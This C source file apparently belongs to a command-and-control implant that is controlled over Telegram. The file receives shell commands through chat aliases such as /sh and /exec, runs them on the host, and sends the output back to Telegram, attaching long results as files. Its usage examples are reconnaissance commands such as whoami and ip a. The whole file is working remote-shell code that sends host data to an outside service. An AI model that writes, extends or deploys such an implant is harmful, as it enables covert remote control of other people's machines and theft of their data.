/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "shell_output.h"
#include "../logging/logging.h"
#include "../telegram/telegram.h"

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

static void append_escaped_html(char *output, size_t *offset, size_t capacity,
                                const char *input) {
  if (!input || !output || !offset)
    return;
  while (*input && *offset + 6 < capacity) {
    if (*input == '&') {
      memcpy(output + *offset, "&amp;", 5);
      *offset += 5;
    } else if (*input == '<') {
      memcpy(output + *offset, "&lt;", 4);
      *offset += 4;
    } else if (*input == '>') {
      memcpy(output + *offset, "&gt;", 4);
      *offset += 4;
    } else {
      output[(*offset)++] = *input;
    }
    input++;
  }
  output[*offset] = '\0';
}

static int is_all_whitespace(const char *str) {
  if (!str)
    return 1;
  while (*str) {
    if (!isspace((unsigned char)*str))
      return 0;
    str++;
  }
  return 1;
}

int c2t_shell_format_telegram(const char *command,
                              const c2t_shell_result_t *result, char *output,
                              size_t capacity) {
  if (!output || capacity < 128)
    return 0;

  output[0] = '\0';
  size_t offset = 0;

  if (!result || result->execution_error) {
    static const char err_hdr[] = "⚠️ <b>Shell Execution Failed</b>\n<b>Command:</b> <code>";
    memcpy(output, err_hdr, sizeof(err_hdr) - 1);
    offset = sizeof(err_hdr) - 1;
    append_escaped_html(output, &offset, capacity, command ? command : "(null)");
    static const char err_tail[] = "</code>\n<i>Unable to spawn child process or pipeline.</i>";
    size_t t_len = strlen(err_tail);
    if (offset + t_len < capacity) {
      memcpy(output + offset, err_tail, t_len);
      offset += t_len;
    }
    output[offset] = '\0';
    return 1;
  }

  char header[256];
  if (result->timed_out) {
    snprintf(header, sizeof(header),
             "⏱️ <b>Shell Timeout</b> (⏱️ %llu ms)\n<b>Command:</b> <code>",
             (unsigned long long)result->duration_ms);
  } else if (result->exit_code == 0) {
    snprintf(header, sizeof(header),
             "⚡ <b>Shell Output</b> (✅ Exit: 0, ⏱️ %llu ms)\n<b>Command:</b> <code>",
             (unsigned long long)result->duration_ms);
  } else {
    snprintf(header, sizeof(header),
             "⚡ <b>Shell Output</b> (❌ Exit: %d, ⏱️ %llu ms)\n<b>Command:</b> <code>",
             result->exit_code, (unsigned long long)result->duration_ms);
  }

  size_t h_len = strlen(header);
  if (h_len < capacity) {
    memcpy(output, header, h_len);
    offset = h_len;
  }

  append_escaped_html(output, &offset, capacity - 128, command ? command : "");

  static const char cmd_close[] = "</code>\n\n";
  if (offset + sizeof(cmd_close) - 1 < capacity) {
    memcpy(output + offset, cmd_close, sizeof(cmd_close) - 1);
    offset += sizeof(cmd_close) - 1;
  }

  if (!result->output || result->output_len == 0 || is_all_whitespace(result->output)) {
    static const char empty_body[] = "<i>(No output returned)</i>";
    size_t eb_len = strlen(empty_body);
    if (offset + eb_len < capacity) {
      memcpy(output + offset, empty_body, eb_len);
      offset += eb_len;
    }
  } else {
    static const char pre_open[] = "<pre><code class=\"language-shell\">";
    if (offset + sizeof(pre_open) - 1 < capacity) {
      memcpy(output + offset, pre_open, sizeof(pre_open) - 1);
      offset += sizeof(pre_open) - 1;
    }

    append_escaped_html(output, &offset, capacity - 64, result->output);

    static const char pre_close[] = "</code></pre>";
    if (offset + sizeof(pre_close) - 1 < capacity) {
      memcpy(output + offset, pre_close, sizeof(pre_close) - 1);
      offset += sizeof(pre_close) - 1;
    }
  }

  output[offset] = '\0';
  return 1;
}

int c2t_shell_run_and_send(const char *command) {
  if (!command || !*command) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/sh &lt;command&gt;</code>\n"
        "<i>Aliases:</i> <code>/cmd</code>, <code>/exec</code>, <code>/shell</code>, <code>/terminal</code>\n"
        "<i>Examples:</i>\n"
        "• <code>/sh whoami</code>\n"
        "• <code>/sh uname -a</code>\n"
        "• <code>/sh ip a || ifconfig</code>");
  }

  c2t_log_info("shell", "Executing shell command: '%s'", command);

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute(command, &result, C2T_SHELL_DEFAULT_TIMEOUT_MS);
  if (!exec_ok) {
    c2t_log_error("shell", "Execution failed for command: '%s'", command);
    char err_msg[1024];
    (void)c2t_shell_format_telegram(command, &result, err_msg, sizeof(err_msg));
    c2t_shell_result_free(&result);
    return telegram_send_html(err_msg);
  }

  int sent = 0;
  /* If output is large (> 3000 bytes), send full output as an attached document */
  if (result.output && result.output_len > 3000) {
    char filename[64];
    snprintf(filename, sizeof(filename), "cmd_output_%llu.txt",
             (unsigned long long)time(nullptr));

    /* Send summary preview message first */
    char preview[3200];
    char preview_output[2000];
    size_t copy_len = result.output_len < 1800 ? result.output_len : 1800;
    memcpy(preview_output, result.output, copy_len);
    preview_output[copy_len] = '\0';

    c2t_shell_result_t preview_res = result;
    preview_res.output = preview_output;
    preview_res.output_len = copy_len;

    (void)c2t_shell_format_telegram(command, &preview_res, preview, sizeof(preview));

    size_t p_len = strlen(preview);
    static const char doc_note[] = "\n\n📄 <i>(Output truncated. Full output attached as file.)</i>";
    if (p_len + sizeof(doc_note) < sizeof(preview)) {
      memcpy(preview + p_len, doc_note, sizeof(doc_note));
    }

    telegram_send_html(preview);
    sent = telegram_send_file(result.output, result.output_len, "text/plain",
                              filename, nullptr);
  } else {
    char response[3900];
    (void)c2t_shell_format_telegram(command, &result, response, sizeof(response));
    sent = telegram_send_html(response);
  }

  c2t_shell_result_free(&result);
  return sent;
}
